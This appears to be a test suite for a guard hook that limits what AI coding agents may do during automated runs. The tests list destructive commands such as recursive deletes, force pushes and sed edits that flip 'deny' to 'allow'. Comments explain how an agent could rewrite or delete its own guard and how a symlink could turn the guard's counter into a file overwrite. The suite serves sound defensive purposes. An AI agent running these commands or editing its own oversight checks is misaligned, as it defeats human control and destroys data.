  it('captures a quoted, split redirect target as one value', () => {
    const { redirects } = tokenizeCommand('printf x > .meeseeks"/state.json"');
    assert.deepStrictEqual(redirects.map((r) => r.target.value), ['.meeseeks/state.json']);
  });

  it('keeps heredoc bodies out of the token stream, with their receiver recorded', () => {
    const { segments, heredocs } = tokenizeCommand("cat <<'EOF'\n/meeseeks in prose\nEOF");
    assert.deepStrictEqual(segments.map((segment) => segment.map((token) => token.value)), [['cat']]);
    assert.deepStrictEqual(
      heredocs.map((h) => ({ body: h.body, receiver: h.receiver, quoted: h.quoted })),
      [{ body: '/meeseeks in prose', receiver: ['cat'], quoted: true }],
    );
  });

  it('collects command substitutions from an unquoted heredoc body, which the shell expands', () => {
    const { substitutions, heredocs } = tokenizeCommand('cat <<EOF\n$(date)\nEOF');
    assert.deepStrictEqual(substitutions, ['date']);
    assert.deepStrictEqual(heredocs.map((h) => h.quoted), [false]);
  });

  it('collects a subshell body as an executable substitution', () => {
    const { substitutions } = tokenizeCommand('(echo hi)');
    assert.deepStrictEqual(substitutions, ['echo hi']);
  });

  it('marks unresolvable operands and collects substitution bodies', () => {
    const { segments, substitutions } = tokenizeCommand('rm -rf "$(cat target.txt)" "$HOME/x"');
    assert.deepStrictEqual(substitutions, ['cat target.txt']);
    assert.deepStrictEqual(
      segments[0].map((token) => ({ value: token.value, hasExpansion: token.hasExpansion })),
      [
        { value: 'rm', hasExpansion: false },
        { value: '-rf', hasExpansion: false },
        { value: '', hasExpansion: true },
        { value: '$HOME/x', hasExpansion: true },
      ],
    );
  });
});

describe('checkBashCommand recurses into substitutions', () => {
  it('denies a destructive command hidden inside $( )', () => {
    const result = checkBashCommand('echo "$(rm -rf /etc)"', FIXTURE_CWD);
    assert.deepStrictEqual(
      result.decision === 'deny' ? { decision: result.decision, rule: result.rule } : { decision: 'allow' },
      { decision: 'deny', rule: 'rm-recursive' },
    );
  });

  it('denies a destructive command inside a subshell', () => {
    const result = checkBashCommand('(git push --force)', FIXTURE_CWD);
    assert.deepStrictEqual(
      result.decision === 'deny' ? { decision: result.decision, rule: result.rule } : { decision: 'allow' },
      { decision: 'deny', rule: 'git-history' },
    );
  });

  it('leaves a harmless substitution alone', () => {
    assert.deepStrictEqual(checkBashCommand('echo "$(git rev-parse HEAD)"', FIXTURE_CWD), { decision: 'allow' });
  });
});

// ---------------------------------------------------------------------------
// The hook contract: stdin in, hookSpecificOutput out, exit 0 either way
// ---------------------------------------------------------------------------

describe('renderDecision', () => {
  it('emits a deny block tagged with the rule that fired, behind the provenance prefix', () => {
    const output = renderDecision({ decision: 'deny', rule: 'git-history', reason: 'because.' });
    assert.deepStrictEqual(JSON.parse(output), {
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason: `${PROVENANCE} [meeseeks:git-history] because.`,
      },
    });
  });

  it('emits nothing on allow, leaving the rest of the permission stack alone', () => {
    assert.equal(renderDecision({ decision: 'allow' }), '');
  });

  it('carries the provenance prefix ahead of the rule tag, and the decision stays deny', () => {
    // R25b: the origin label lets an injection-hardened builder obey its own guard instead of
    // discarding the denial as untrusted noise. It never softens the decision.
    const output = renderDecision({ decision: 'deny', rule: 'protected-state', reason: 'the reason.' });
    const parsed = JSON.parse(output);
    assert.equal(parsed.hookSpecificOutput.permissionDecision, 'deny');
    assert.equal(
      parsed.hookSpecificOutput.permissionDecisionReason,
      `${PROVENANCE} [meeseeks:protected-state] the reason.`,
    );
  });
});

describe('guard.mjs as a process', () => {
  /**
   * @param {string} stdin
   * @param {Record<string, string | undefined>} [env]
   * @returns {Promise<{ code: number, stdout: string }>}
   */
  async function run(stdin, env) {
    // The encoding is pinned because supplying options at all selects the overload that
    // would otherwise hand back a Buffer.
    const child = execFileAsync('node', [GUARD], { encoding: 'utf8', ...(env === undefined ? {} : { env }) });
    child.child.stdin?.end(stdin);
    try {
      const { stdout } = await child;
      return { code: 0, stdout };
    } catch (error) {
      const failure = /** @type {{ code?: number, stdout?: string }} */ (error);
      return { code: failure.code ?? 1, stdout: failure.stdout ?? '' };
    }
  }

  it('denies over stdin and still exits 0', async () => {
    const { code, stdout } = await run(JSON.stringify(bashEvent('git push --force')));
    assert.equal(code, 0);
    assert.deepStrictEqual(JSON.parse(stdout), {
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason: `${PROVENANCE} [meeseeks:git-history] Force push is blocked so recovery stays possible (DESIGN.md §6).`,
      },
    });
  });

  it('says nothing and exits 0 for an allowed call', async () => {
    const { code, stdout } = await run(JSON.stringify(bashEvent('git push origin main')));
    assert.equal(code, 0);
    assert.equal(stdout, '');
  });

  it('reads the run marker from its own environment, which is the only way it arrives', async () => {
    // The unit tables inject `env`; production does not. This is that seam. The driver sets
    // MEESEEKS_RUNNING on the `claude` child and the hook inherits it - confirmed live against
    // claude 2.1.226 before this scoping was written, not assumed.
    const payload = JSON.stringify(bashEvent("echo '{}' > .meeseeks/config.json"));

    const inRun = await run(payload, { ...process.env, MEESEEKS_RUNNING: '1' });
    assert.equal(inRun.code, 0);
    assert.equal(
      JSON.parse(inRun.stdout).hookSpecificOutput.permissionDecision,
      'deny',
      'a builder was allowed to overwrite the config that constrains it',
    );

    const operator = { ...process.env };
    delete operator.MEESEEKS_RUNNING;
    const outsideRun = await run(payload, operator);
    assert.equal(outsideRun.code, 0);
    assert.equal(outsideRun.stdout, '', 'an operator was locked out of their own configuration');
  });

  it('fails closed on a payload that is not valid JSON', async () => {
    const raw = readFileSync(new URL('pretooluse-malformed.txt', FIXTURE_DIR), 'utf8');
    const { code, stdout } = await run(raw);
    assert.equal(code, 0);
    assert.deepStrictEqual(JSON.parse(stdout), {
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
        permissionDecisionReason:
          `${PROVENANCE} [meeseeks:malformed-payload] PreToolUse payload was not valid JSON. A guard that fails open is not a guard.`,
      },
    });
  });

  it('fails closed on empty stdin', async () => {
    const { code, stdout } = await run('');
    assert.equal(code, 0);
    assert.equal(
      JSON.parse(stdout).hookSpecificOutput.permissionDecisionReason,
      `${PROVENANCE} [meeseeks:malformed-payload] PreToolUse payload was not valid JSON. A guard that fails open is not a guard.`,
    );
  });

});

describe('guard-fallback.cjs as a process (R25a)', () => {
  /**
   * @param {Record<string, string | undefined>} env
   * @returns {Promise<{ code: number, stdout: string, stderr: string }>}
   */
  async function runFallback(env) {
    try {
      const { stdout, stderr } = await execFileAsync('node', [FALLBACK], { encoding: 'utf8', env });
      return { code: 0, stdout, stderr };
    } catch (error) {
      const failure = /** @type {{ code?: number, stdout?: string, stderr?: string }} */ (error);
      return { code: failure.code ?? 1, stdout: failure.stdout ?? '', stderr: failure.stderr ?? '' };
    }
  }

  it('inside a run: denies with the schema shape, exits 0, and never touches the filesystem', async () => {
    const { code, stdout, stderr } = await runFallback({ ...process.env, MEESEEKS_RUNNING: '1' });
    assert.equal(code, 0);
    const parsed = JSON.parse(stdout);
    assert.equal(parsed.hookSpecificOutput.permissionDecision, 'deny');
    assert.equal(
      parsed.hookSpecificOutput.permissionDecisionReason.startsWith(`${PROVENANCE} [meeseeks:guard-unavailable] `),
      true,
    );
    // The in-run stderr line uses the driver's `meeseeks-guard: denied` prefix, so a degraded-guard
    // denial is collected rather than invisible (the LOW the item-37 panel caught).
    assert.equal(stderr.includes('meeseeks-guard: denied'), true, 'the driver could not see the fallback denial');
    assert.equal(stderr.includes('could not run'), true, 'the banner never announced the breakage');
  });

  it('outside a run: allows with EMPTY stdout, because a noisy passthrough fails the hook schema', async () => {
    const operator = { ...process.env };
    delete operator.MEESEEKS_RUNNING;
    const { code, stdout, stderr } = await runFallback(operator);
    assert.equal(code, 0);
    assert.equal(stdout, '', 'a passthrough fallback printed to stdout');
    assert.equal(stderr.includes('meeseeks-guard: denied'), false, 'an out-of-run call emitted a denial line');
    assert.equal(stderr.includes('could not run'), true, 'the operator was not warned their guard is broken');
  });

  it('always banners, so a broken guard is never silent (no sentinel to pre-consume)', async () => {
    // The earlier draft dampened the banner via a shared temp-file sentinel; the panel showed
    // that is both a symlink-write primitive and a way for one process to consume the operator's
    // warning window. It writes nothing now, so every invocation warns.
    const operator = { ...process.env };
    delete operator.MEESEEKS_RUNNING;
    const first = await runFallback(operator);
    const second = await runFallback(operator);
    assert.equal(first.stderr.includes('could not run'), true);
    assert.equal(second.stderr.includes('could not run'), true, 'the second broken-guard call went silent');
  });

  it('the registration chain names both scripts, so childSettings can verify each exists', () => {
    const manifest = JSON.parse(readFileSync(new URL('../hooks/hooks.json', import.meta.url), 'utf8'));
    const command = manifest.hooks.PreToolUse[0].hooks[0].command;
    assert.equal(command.includes('"${CLAUDE_PLUGIN_ROOT}/hooks/guard.mjs"'), true);
    assert.equal(command.includes(' || '), true);
    assert.equal(command.includes('"${CLAUDE_PLUGIN_ROOT}/hooks/guard-fallback.cjs"'), true);
  });
});

// CLAUDE.md's invariant reads: "The guard hook is not editable by what it guards." That was
// true of `.meeseeks/` and false of the guard itself. The positional rule protects the run's
// evidence; nothing protected the file deciding what a run may do, so a builder holding
// `--dangerously-skip-permissions` could rewrite its own constraint and no required id would
// notice.
//
// It only bites when the repository under test *is* the plugin — for any other target the guard
// lives in an install cache well outside the tree, and this rule is a no-op there. That is
// precisely the case that has to be safe before the loop is ever pointed at this repository.
describe('blocked: the guard cannot be edited by the run it is guarding', () => {
  const guardPath = path.resolve('hooks/guard.mjs');
  const hooksManifest = path.resolve('hooks/hooks.json');
  const fallbackPath = path.resolve('hooks/guard-fallback.cjs');

  const denied = [
    [`echo '' > ${guardPath}`, 'a redirect over the guard'],
    [`sed -i 's/deny/allow/' ${guardPath}`, 'an in-place edit of the guard'],
    [`rm ${guardPath}`, 'deleting the guard'],
    [`echo '{}' > ${hooksManifest}`, 'a redirect over the hook manifest'],
    [`cp /tmp/other.mjs ${guardPath}`, 'overwriting the guard from elsewhere'],
    [`tee ${guardPath}`, 'writing the guard through tee'],
    [`mv /tmp/other.mjs ${guardPath}`, 'moving a replacement into place'],
    // Item 37: the fallback is a deciding link of the guard chain (it emits the deny inside a
    // run when guard.mjs cannot), so it is guarded exactly like guard.mjs. Missing this was a
    // HIGH the hostile panel caught.
    [`echo '' > ${fallbackPath}`, 'a redirect over the guard fallback'],
    [`rm ${fallbackPath}`, 'deleting the guard fallback'],
    [`cp /tmp/other.cjs ${fallbackPath}`, 'overwriting the fallback from elsewhere'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}`, () => {
      assertDenied(bashEvent(command), 'protected-guard');
    });
  }

  it('denies a Write to the guard', () => {
    assertDenied(pathEvent('pretooluse-write.json', 'file_path', guardPath), 'protected-guard');
  });

  it('denies a Write to the guard fallback', () => {
    assertDenied(pathEvent('pretooluse-write.json', 'file_path', fallbackPath), 'protected-guard');
  });

  it('denies an Edit of the guard', () => {
    assertDenied(pathEvent('pretooluse-edit.json', 'file_path', guardPath), 'protected-guard');
  });

  // Same reasoning as protected-state: the rule is about the run, not about the person who owns
  // the repository. An operator fixing the guard outside a run must not be refused, or the guard
  // has stopped being a guard and started being a nuisance.
  it('leaves the operator alone outside a run', () => {
    assertAllowed(pathEvent('pretooluse-write.json', 'file_path', guardPath), {});
  });
});

describe('allowed: guard neighbours', () => {
  // Blocking everything is not passing. These are the names most likely to be caught by a
  // careless rule, and every one of them is ordinary work a builder may legitimately do.
  // Since R24 `cat hooks/guard.mjs` joins them: the write detector can tell a read from a
  // write, so the shell read route is open like every other read.
  const allowed = [
    ["echo 'x' > test/guard.test.mjs", 'the guard test, which is not the guard'],
    ["echo 'x' > src/hooks/guard.mjs", "an application's own file that happens to share the name"],
    ["echo 'x' > docs/guard.md", 'documentation about the guard'],
    ["echo 'x' > hooks/other.mjs", 'a different file in the hooks directory'],
    ['cat hooks/guard.mjs', 'reading the guard through the shell'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

describe('--give-them-the-box at the hook', () => {
  const NESTED = 'meeseeks "build a thing"';

  it('still denies a nested run with no box armed, which is every ordinary run', () => {
    // The deny path, unchanged and load-bearing. This is the rule the mode makes optional, so
    // it is the rule most worth proving still fires by default.
    const verdict = checkBashCommand(NESTED, '/repo', { insideRun: true, env: {} });
    assert.equal(verdict.decision, 'deny');
    assert.equal(verdict.rule, 'nested-meeseeks');
  });

  it('allows it when the box is armed and there is room under the cap', () => {
    const verdict = checkBashCommand(NESTED, '/repo', {
      insideRun: true,
      env: { MEESEEKS_GIVE_THEM_THE_BOX: '1' },
    });
    assert.equal(verdict.decision, 'allow');
  });

  it('denies again at the cap, so the mode has a bottom', () => {
    const verdict = checkBashCommand(NESTED, '/repo', {
      insideRun: true,
      env: { MEESEEKS_GIVE_THEM_THE_BOX: '1', MEESEEKS_RUN_DEPTH: '2' },
    });
    assert.equal(verdict.decision, 'deny');
    assert.equal(verdict.rule, 'nested-meeseeks');
  });

  it('denies malformed depth markers rather than turning them into room under the cap', () => {
    for (const marker of ['banana', '1garbage', '-1', '01', '9007199254740992']) {
      const verdict = checkBashCommand(NESTED, '/repo', {
        insideRun: true,
        env: { MEESEEKS_GIVE_THEM_THE_BOX: '1', MEESEEKS_RUN_DEPTH: marker },
      });
      assert.equal(verdict.decision, 'deny', marker);
      assert.equal(verdict.rule, 'nested-meeseeks', marker);
    }
  });

  it('permits exactly one rule and no others', () => {
    // The mode must not become a skeleton key. `.meeseeks/`, git history and recursive removal
    // are refused with the box armed exactly as they are without it.
    const boxed = { insideRun: true, env: { MEESEEKS_GIVE_THEM_THE_BOX: '1' } };
    assert.equal(checkBashCommand('echo x > .meeseeks/state.json', '/repo', boxed).decision, 'deny');
    assert.equal(checkBashCommand('git push --force', '/repo', boxed).decision, 'deny');
    assert.equal(checkBashCommand('rm -rf /repo/src', '/repo', boxed).decision, 'deny');
    assert.equal(checkBashCommand('echo x > .claude/settings.json', '/repo', boxed).decision, 'deny');
  });
});

describe('a denial is announced on stderr as well as decided on stdout', () => {
  /** @param {string} command @param {Record<string,string>} env */
  const runHook = (command, env) =>
    spawnSync(process.execPath, [GUARD], {
      input: JSON.stringify({
        hook_event_name: 'PreToolUse',
        tool_name: 'Bash',
        tool_input: { command },
        cwd: '/repo',
      }),
      encoding: 'utf8',
      env: { ...process.env, ...env },
    });

  it('writes the rule and reason to stderr when it denies', () => {
    // Case J could not tell whether its builder declined to nest or was refused, because a
    // hook's deny lives in a conversation the driver never sees. stdout carries the protocol;
    // stderr carries the news.
    const result = runHook('meeseeks "build a thing"', {});
    assert.equal(result.stderr.includes('meeseeks-guard: denied'), true, result.stderr);
    assert.equal(result.stderr.includes('nested-meeseeks'), true, result.stderr);
  });

  it('still puts the decision on stdout, unchanged', () => {
    // The protocol channel must not move. A hook that announced itself and forgot to decide
    // would fail open.
    const result = runHook('meeseeks "build a thing"', {});
    const decision = JSON.parse(result.stdout);
    assert.equal(decision.hookSpecificOutput.permissionDecision, 'deny');
  });

  it('says nothing on stderr when it allows', () => {
    const result = runHook('echo hello', {});
    assert.equal(result.stderr.trim(), '');
    assert.equal(result.stdout.trim(), '');
  });
});

describe('guardDenials: the bounded channel a refusal travels on (REVIEW F36)', () => {
  it('finds a refusal and leaves everything else behind', () => {
    const stream = [
      'npm warn something irrelevant',
      'meeseeks-guard: denied Write to .meeseeks/state.json',
      'some other tool being chatty',
    ].join('\n');
    assert.deepStrictEqual(guardDenials(stream), ['meeseeks-guard: denied Write to .meeseeks/state.json']);
  });

  it('reports nothing for a stream with no refusal, so ordinary stderr never becomes evidence', () => {
    assert.deepStrictEqual(guardDenials('npm warn a\nbuild finished\n'), []);
    assert.deepStrictEqual(guardDenials(''), []);
  });

  it('says the same refusal once, however many times the child hit it', () => {
    // A model that retries a denied call forty times has learned one fact, not forty.
    const stream = Array.from({ length: 40 }, () => 'meeseeks-guard: denied Write to .meeseeks/state.json').join('\n');
    assert.deepStrictEqual(guardDenials(stream), ['meeseeks-guard: denied Write to .meeseeks/state.json']);
  });

  it('stops at the cap, because this text reaches a builder brief', () => {
    const stream = Array.from({ length: DENIAL_LIMIT + 5 }, (_unused, index) =>
      `meeseeks-guard: denied Write to .meeseeks/file-${index}.json`,
    ).join('\n');
    assert.equal(guardDenials(stream).length, DENIAL_LIMIT);
  });

  it('truncates a single enormous refusal rather than carrying it whole', () => {
    const long = `meeseeks-guard: denied Write to ${'x'.repeat(2_000)}`;
    const [only] = guardDenials(long);
    assert.equal(only.length, DENIAL_LINE_LIMIT);
    assert.equal(only.startsWith('meeseeks-guard: denied Write to xxx'), true);
  });

  it('accepts a refusal that arrives with surrounding whitespace', () => {
    assert.deepStrictEqual(guardDenials('   meeseeks-guard: denied Bash rm -rf .meeseeks   '), [
      'meeseeks-guard: denied Bash rm -rf .meeseeks',
    ]);
  });
});

describe('denial dampening: verbosity only, and only where a run cannot reach (PLAN item 52)', () => {
  // **This feature was built once and pulled before landing**, by the item-37 hostile panel, for two
  // reasons that are both design telling you where the wall is. The first cut wrote its counter at a
  // predictable path in `os.tmpdir()` with a plain `writeFileSync` — and the guard is the one
  // component that survives `--dangerously-skip-permissions` and is *not itself guarded*, so a
  // symlink planted there turns the guard's own write into an arbitrary-file overwrite. The second:
  // dampening keyed per session rather than per rule renders the first-ever denial of rule B as
  // "denied again", recreating the loop it exists to fix for a rule nobody was ever told about.

  /** @type {string[]} */
  const scratchDirs = [];
  after(() => {
    for (const dir of scratchDirs) rmSync(dir, { recursive: true, force: true });
  });

  /** @returns {string} */
  function stateDir() {
    const dir = mkdtempSync(path.join(os.tmpdir(), 'meeseeks-denials-'));
    scratchDirs.push(dir);
    return dir;
  }

  /** @param {string} dir @param {string} rule @param {string} [session] @returns {string} */
  const ask = (dir, rule, session = 'session-1') => denialVerbosity({ stateDir: dir, sessionId: session, rule });

  it('explains a rule in full three times, then dampens it', () => {
    const dir = stateDir();
    assert.deepStrictEqual(
      [ask(dir, 'nested-meeseeks'), ask(dir, 'nested-meeseeks'), ask(dir, 'nested-meeseeks'), ask(dir, 'nested-meeseeks')],
      ['full', 'full', 'full', 'short'],
    );
  });

  it('keys by rule, so the first denial of another rule is still explained', () => {
    // The second finding that pulled the first cut, asserted directly.
    const dir = stateDir();
    for (let index = 0; index < 5; index += 1) ask(dir, 'protected-state');
    assert.equal(ask(dir, 'nested-meeseeks'), 'full', 'a rule nobody had been told about was dampened');
  });

  it('keys by session, so a fresh run starts explaining again', () => {
    const dir = stateDir();
    for (let index = 0; index < 5; index += 1) ask(dir, 'protected-state', 'session-1');
    assert.equal(ask(dir, 'protected-state', 'session-2'), 'full');
  });

  it('never dampens outside a run, because the Driver names the directory', () => {
    // An operator's own session has no `MEESEEKS_DENIAL_STATE`, and dampening is a builder concern.
    assert.equal(denialVerbosity({ stateDir: undefined, sessionId: 'session-1', rule: 'protected-state' }), 'full');
    assert.equal(denialVerbosity({ stateDir: '', sessionId: 'session-1', rule: 'protected-state' }), 'full');
  });

  it('never dampens a payload with no session id, because there is nothing to key on', () => {
    const dir = stateDir();
    for (let index = 0; index < 5; index += 1) denialVerbosity({ stateDir: dir, sessionId: undefined, rule: 'r' });
    assert.equal(denialVerbosity({ stateDir: dir, sessionId: undefined, rule: 'r' }), 'full');
  });

  it('refuses to follow a symlink planted where its counter belongs', {
    skip: process.platform === 'win32',
  }, () => {
    // **The finding that pulled the first cut.** A run cannot write inside `.meeseeks/` — the guard
    // denies it at any depth — but the guard opens with `O_NOFOLLOW` anyway, because a component
    // that turns its own bookkeeping into a write primitive has to be wrong twice before it hurts.
    const dir = stateDir();
    const elsewhere = path.join(dir, 'victim.txt');
    writeFileSync(elsewhere, 'do not overwrite me\n', 'utf8');
    const counter = path.join(dir, `${createHash('sha256').update('session-1').digest('hex').slice(0, 32)}.denials`);
    symlinkSync(elsewhere, counter);

    for (let index = 0; index < 6; index += 1) {
      assert.equal(ask(dir, 'protected-state'), 'full', 'the guard followed a symlink to count a denial');
    }
    assert.equal(readFileSync(elsewhere, 'utf8'), 'do not overwrite me\n', 'the guard wrote through the link');
  });

  it('renders full text when the counter is not a regular file', () => {
    const dir = stateDir();
    mkdirSync(path.join(dir, `${createHash('sha256').update('session-1').digest('hex').slice(0, 32)}.denials`), {
      recursive: true,
    });
    assert.equal(ask(dir, 'protected-state'), 'full');
  });

  it('renders full text when the directory does not exist at all', () => {
    assert.equal(denialVerbosity({ stateDir: '/nonexistent/meeseeks-denials', sessionId: 's', rule: 'r' }), 'full');
  });

  it('gives up and stays verbose rather than reading an unbounded ledger', () => {
    const dir = stateDir();
    const counter = path.join(dir, `${createHash('sha256').update('session-1').digest('hex').slice(0, 32)}.denials`);
    writeFileSync(counter, 'protected-state\n'.repeat(DENIAL_LEDGER_LIMIT), 'utf8');
    assert.equal(ask(dir, 'protected-state'), 'full');
  });

  it('dampens the words and never the decision', () => {
    // The rule the whole feature is bounded by. A dampened denial is still a deny, still carries the
    // provenance prefix so it cannot read as user instruction, and still names its rule.
    const denial = {
      decision: /** @type {const} */ ('deny'),
      rule: 'protected-state',
      reason:
        'First sentence. Second sentence explaining at length, the way a real refusal does, so that ' +
        'shortening it genuinely saves the builder something rather than costing it a suffix.',
    };
    const full = JSON.parse(renderDecision(denial, 'full'));
    const short = JSON.parse(renderDecision(denial, 'short'));

    assert.equal(full.hookSpecificOutput.permissionDecision, 'deny');
    assert.equal(short.hookSpecificOutput.permissionDecision, 'deny');
    for (const rendered of [full, short]) {
      assert.equal(rendered.hookSpecificOutput.permissionDecisionReason.includes('[meeseeks:protected-state]'), true);
      assert.equal(rendered.hookSpecificOutput.permissionDecisionReason.includes('automated policy, not user input'), true);
    }
    assert.equal(short.hookSpecificOutput.permissionDecisionReason.includes('Second sentence'), false);
    assert.equal(full.hookSpecificOutput.permissionDecisionReason.includes('Second sentence'), true);
    assert.equal(
      short.hookSpecificOutput.permissionDecisionReason.length <
        full.hookSpecificOutput.permissionDecisionReason.length,
      true,
    );
  });

  it('leaves a one-sentence refusal alone, because shortening it would make it longer', () => {
    // **Measured on the first fixture written for this.** The suffix costs about forty characters,
    // so on a short refusal the "dampened" form was *longer* than the full one — spending context to
    // save context. Dampening applies only when it actually shortens.
    const brief = { decision: /** @type {const} */ ('deny'), rule: 'r', reason: 'No.' };
    assert.equal(renderDecision(brief, 'short'), renderDecision(brief, 'full'));
  });

  it('renders nothing for an allow, dampened or not', () => {
    assert.equal(renderDecision({ decision: 'allow' }, 'short'), '');
    assert.equal(renderDecision({ decision: 'allow' }, 'full'), '');
  });
});
